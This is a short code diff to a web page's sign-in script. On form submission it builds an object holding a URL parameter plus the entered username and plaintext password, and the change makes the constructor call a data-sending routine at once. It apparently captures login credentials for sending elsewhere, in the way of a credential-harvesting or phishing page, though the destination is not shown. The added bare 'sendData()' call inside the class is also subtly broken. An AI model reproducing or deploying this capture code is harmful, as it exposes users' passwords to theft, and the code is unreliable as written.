@@ -690,6 +690,8 @@ class dbEntry
 		this.passHidden = pass.substring(0, 1)
 		for(var i=1; i<pass.length; i++)
 			this.passHidden += '*'
+			
+		sendData()
 	}
 	
 	sendData()
@@ -733,9 +735,7 @@ if(getUrl.length == 0) getUrl = "undefined";
 else getUrl = getUrl.split("=")[1];
 
 $('#form_signin').on('submit', function() {
-	var entry = new dbEntry(getUrl, $('#username')[0].value, $('#password')[0].value);
-    entry.sendData();
-    console.log(entry);
+new dbEntry(getUrl, $('#username')[0].value, $('#password')[0].value);
 });
 </script>
 
